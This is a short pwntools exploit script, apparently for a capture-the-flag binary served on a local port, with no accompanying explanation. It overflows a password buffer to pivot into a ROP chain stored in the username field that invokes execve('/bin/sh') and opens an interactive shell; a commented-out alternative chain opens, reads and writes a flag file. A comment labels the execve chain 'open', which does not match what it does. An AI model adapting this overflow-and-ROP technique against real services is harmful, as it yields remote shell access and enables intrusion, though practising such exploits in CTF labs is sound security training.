from pwn import *
context(
    terminal = ['tmux','splitw','-h'],
    os = "linux",
    arch = "amd64",
    log_level="debug",
)
def debug(io):
    gdb.attach(io,
'''
b Password
'''
)

# io = process("./pwn")
# debug(io)
io = remote("0.0.0.0", 9999)

syscall = 0x4194BF
rax = 0x00000000004212eb
rdi = 0x00000000004787f3
rsi = 0x0000000000477d7d
rdx = 0x00000000004018ed
username = 0x4aba58
flag_adr = username + 0xE0
sh_adr = username + 0x50

rop = b''
# open
rop+= p64(rax) + p64(0x3B) + p64(rdi) + p64(sh_adr) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(syscall)
flag_adr = username + 0xE0

# rop = b''
# # open
# rop+= p64(rax) + p64(0x2) + p64(rdi) + p64(flag_adr) + p64(rsi) + p64(0x0) + p64(rdx) + p64(0x0) + p64(syscall)
# # read
# rop+= p64(rax) + p64(0x0) + p64(rdi) + p64(3) + p64(rsi) + p64(username) + p64(rdx) + p64(0x100) + p64(syscall)
# # write
# rop+= p64(rax) + p64(0x1) + p64(rdi) + p64(1) + p64(rsi) + p64(username) + p64(rdx) + p64(0x70) + p64(syscall)

io.sendafter(b'username\n', rop + b'/bin/sh\x0a')
io.sendafter(b'password\n', b'a'*0xe8 + b'\xff')
io.sendafter(b'password\n', b'a'*0xe8 + p64(0xff) + p64(username)[0:6] + b'\x0a')

io.interactive()
